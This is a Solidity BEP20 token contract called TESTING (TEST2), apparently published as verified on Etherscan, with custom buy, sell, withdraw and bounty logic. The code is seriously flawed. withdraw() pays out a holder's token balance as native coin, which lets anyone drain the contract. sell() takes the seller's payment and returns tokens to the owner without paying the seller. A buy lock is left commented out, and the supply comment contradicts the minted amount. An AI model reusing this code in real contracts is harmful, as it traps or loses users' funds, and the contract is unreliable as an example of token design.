/**
 *Submitted for verification at Etherscan.io on 2021-12-22
*/

// SPDX-License-Identifier: MIT

/* 
 * Website  : https://www.testing.com  
 * Name     : TESTING
 * Symbol   : TEST2
*/

pragma solidity 0.8.9;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


/**
 * @dev Interface of the BEP20 standard as defined in the EIP.
 */
interface IBEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Buy(address member, uint256 etherAmount, uint256 tokens);
    event Sell(address member, uint256 etherAmount, uint256 tokens);
}


/**
 * @dev Interface for the optional metadata functions from the BEP20 standard.
 *
 * _Available since v4.1._
 */
interface IBEP20Metadata is IBEP20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}



contract BEP20 is Context, IBEP20, IBEP20Metadata {
    using SafeMath for uint256;
    mapping(address => uint256) public _balances;
    mapping(address => uint256) private _lock_buy;
    mapping(address => uint256) private _locktime_buy;
    mapping(address => uint256) private _lock;
    mapping(address => uint256) private _locktime;
    mapping(address => uint256) private _buy_bal;
    mapping(address => uint256) private _bou_bal;

    uint256 private _totalSupply;

    string public _name;
    string public _symbol;
    uint8 public _decimal;
    uint256 private _deploy_time = block.timestamp;
    uint256 private _one = 1000000000000000000;
    uint256 public _bnb_token_rate = 18914000000000;
    uint256 private _per_token_increase = 10000000000000000000000;
    uint256 private _lock_amount;
    address private owners;
    address[] private buyers;
    address[] private bountys;
    uint8 private sell_tokens;
    uint256 public pur_token;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_, uint8 decimal_) {
        _name = name_;
        _symbol = symbol_;
        _decimal = decimal_;
        address msgSender = _msgSender();
        owners = msgSender;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {BEP20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IBEP20-balanceOf} and {IBEP20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimal;
    }

    function getOwner() public view virtual returns (address) {
        return owners;
    }

    /**
     * @dev See {IBEP20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IBEP20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IBEP20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */


    function buy() public payable returns (uint256) {
        uint8 _lock_status = 0;
        uint256 _bnb_token_rate_per = 0;
        if (block.timestamp >= _deploy_time + 300 seconds) {
            _lock_amount = _balances[getOwner()];
            _lock_status = 1;
        }
        //require(_lock_status == 0, "Buy is locked");//uncoment when to deploy
        require(_msgSender() != getOwner(), "Invalid sender");
        
        uint256 _acc_balance = _balances[getOwner()];
        uint256 one_bnb_token_qty = _one.div(_bnb_token_rate);//token qty of 1 bnb
        uint256 token_qty = one_bnb_token_qty.mul(msg.value);//token qty in value bnb

        require(_acc_balance >= token_qty, "BEP20: transfer amount exceeds balance");

        emit Transfer(getOwner(), _msgSender(), token_qty);
        emit Buy(_msgSender(), msg.value, token_qty);

        _balances[getOwner()] -= token_qty;
        _balances[_msgSender()] += token_qty;
        pur_token += token_qty;
        push_buyer(_msgSender(), token_qty);

        if (pur_token >= _per_token_increase) {
            _bnb_token_rate_per = _bnb_token_rate.div(uint(100));
            _bnb_token_rate = _bnb_token_rate.add(_bnb_token_rate_per);
            _per_token_increase = _per_token_increase + 10000000000000000000000;
        }

        return token_qty;

    }

    function withdraw() public {
        uint amount = _balances[_msgSender()];
        // Remember to zero the pending refund before
        // sending to prevent re-entrancy attacks
        _balances[_msgSender()] = 0;
        payable(_msgSender()).transfer(amount);
    }

    function sell() public payable returns (uint256) {
        require(_msgSender() != getOwner(), "Invalid sender");

        uint256 buy_balance_ = _buy_bal[_msgSender()];
        uint256 bou_balance_ = _bou_bal[_msgSender()];
        uint256 _acc_balance = _balances[_msgSender()];
        uint8 user_type1 = 0;
        uint8 user_type2 = 0;
        uint8 user_type3 = 0;
        uint8 bounty = 0;
        uint8 buyer = 0;
        uint8 can_transfer = 0;
        uint256 one_bnb_token_qty = _one.div(_bnb_token_rate);//token qty of 1 bnb
        uint256 token_qty = one_bnb_token_qty.mul(msg.value);//token qty in value bnb

        require(_acc_balance >= token_qty, "BEP20: transfer amount exceeds balance");

        for (uint i = 0; i < bountys.length; i++) {
            if(bountys[i] == _msgSender()) {
                bounty = 1;
                break;
            }
        }

        //only buyer
        for (uint i = 0; i < buyers.length; i++) {
            if(buyers[i] == _msgSender() && bounty == 0) {
                buyer = 1;
                user_type1 = 1;
                break;
            }
        }

        //only bounty
        if(bounty == 1 && buyer == 0) {
            user_type2 = 1;
        }

        //both
        if(bounty == 1 && buyer == 1) {
            user_type3 = 1;
        }

        if (user_type1 == 1) {//only buyer condition
            if (block.timestamp >= _locktime_buy[_msgSender()] + 300 seconds) {
                _lock_buy[_msgSender()] = 0;
                _locktime_buy[_msgSender()] = 0;
                can_transfer = 1;
                _buy_bal[_msgSender()] -= token_qty;
                
                for (uint i = 0; i < buyers.length; i++) {
                    if(buyers[i] == _msgSender()) {
                        delete buyers[i];
                        break;
                    }
                }
            }
        } else if (user_type2 == 1) {//only bounty condition
            if (block.timestamp >= _locktime[_msgSender()] + 300 seconds) {
                _lock[_msgSender()] = 0;
                _locktime[_msgSender()] = 0;
                can_transfer = 1;
                _bou_bal[_msgSender()] -= token_qty;

                for (uint i = 0; i < bountys.length; i++) {
                    if(bountys[i] == _msgSender()) {
                        delete bountys[i];
                        break;
                    }
                }
            }
        } else if (user_type3 == 1) {//both condition
            if(_lock_buy[_msgSender()] == 0 && block.timestamp < _locktime[_msgSender()] + 300 seconds) {//buyer
                can_transfer = 1;
                _buy_bal[_msgSender()] -= token_qty;
                
                for (uint i = 0; i < buyers.length; i++) {
                    if(buyers[i] == _msgSender()) {
                        delete buyers[i];
                        break;
                    }
                }
            } else if(_lock_buy[_msgSender()] == 1 && block.timestamp >= _locktime[_msgSender()] + 300 seconds) {//bounty
                can_transfer = 1;
                _bou_bal[_msgSender()] -= token_qty;

                for (uint i = 0; i < bountys.length; i++) {
                    if(bountys[i] == _msgSender()) {
                        delete bountys[i];
                        break;
                    }
                }
            } else if(_lock_buy[_msgSender()] == 0 && block.timestamp >= _locktime[_msgSender()] + 300 seconds) {
                if(buy_balance_ >= token_qty && bou_balance_ >= token_qty) {
                    _buy_bal[_msgSender()] -= token_qty;
                    can_transfer = 1;
                
                    for (uint i = 0; i < buyers.length; i++) {
                        if(buyers[i] == _msgSender()) {
                            delete buyers[i];
                            break;
                        }
                    }
                } else if(buy_balance_ >= token_qty) {
                    _buy_bal[_msgSender()] -= token_qty;
                    can_transfer = 1;
                
                    for (uint i = 0; i < buyers.length; i++) {
                        if(buyers[i] == _msgSender()) {
                            delete buyers[i];
                            break;
                        }
                    }
                } else if(bou_balance_ >= token_qty) {
                    _bou_bal[_msgSender()] -= token_qty;
                    can_transfer = 1;

                    for (uint i = 0; i < bountys.length; i++) {
                        if(bountys[i] == _msgSender()) {
                            delete bountys[i];
                            break;
                        }
                    }
                }
            }
        }

        if (can_transfer == 1) {
            emit Transfer(_msgSender(), getOwner(), token_qty);
            emit Sell(_msgSender(), msg.value, token_qty);

            _balances[_msgSender()] -= token_qty;
            _balances[getOwner()] += token_qty;

        } else {
            revert("You can't sell");
        }

        return token_qty;

    }

    function push_buyer(address buyer, uint256 amounts) private {
        buyers.push(buyer);
        _buy_bal[buyer] += amounts;

        if(_locktime_buy[buyer] <= 0) {
            _lock_buy[buyer] = 1;

            _locktime_buy[buyer] = block.timestamp;
        }
    }

    function push_bounty(address bounty, uint256 amounts) public {
        require(_msgSender() == getOwner(), "Invalid sender");

        bountys.push(bounty);
        _bou_bal[bounty] += amounts;
        _lock[bounty] = 1;
        _locktime[bounty] = block.timestamp;

        emit Transfer(getOwner(), bounty, amounts);//10-1=9

        _balances[bounty] += amounts;//temp

        _balances[getOwner()] -= amounts;//temp
    }

    function sell_allowance(uint8 can_sell) public virtual returns (bool) {
        require(_msgSender() == getOwner(), "Invalid sender");
        
        sell_tokens = can_sell;
        for (uint i = 0; i < buyers.length; i++) {
            _lock_buy[buyers[i]] = 0;
            _locktime_buy[buyers[i]] = 0;
        }

        return true;
    }
}

contract TESTING is BEP20,Ownable {

    constructor()
         BEP20("TESTING", "TEST2", 18) {
             /* 750 Million Total Supply */
            _mint(msg.sender, 175 * (10 ** uint256(6)) * (10 ** uint256(18)));
        }

}